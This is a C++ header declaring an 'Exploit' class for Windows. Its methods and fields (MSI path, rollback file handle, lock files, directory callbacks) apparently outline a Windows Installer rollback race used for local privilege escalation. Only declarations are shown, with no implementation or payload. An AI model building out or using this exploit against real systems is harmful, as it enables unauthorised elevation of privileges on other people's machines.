#pragma once

#include <Windows.h>
#include <string>

class Exploit
{
public:
    Exploit(const std::string& p_msi_path, const std::string& p_target_path, const std::string& p_install_path);
    ~Exploit();

    void load_ntdll();
    void exploit_thread();
    void callback_one();
    void callback_two();
    bool create_temp_files();

private:

    const std::string m_msi_path;
    const std::string m_target_path;
    const std::string m_tmp_base_path;
    std::string m_cb_directory;
    HANDLE m_cb_directory_handle;
    const std::string m_tmp_inner_path;
    const std::string m_tmp_inner_tmp;
    const std::string m_tmp_outter_file;
    const std::string m_tmp_lock_file;
    std::string m_rbf_path;
    std::string m_rbf_name;
    HANDLE m_rbf_handle;
    HANDLE m_lock_handle;
    HANDLE m_inner_shake_directory_handle;
};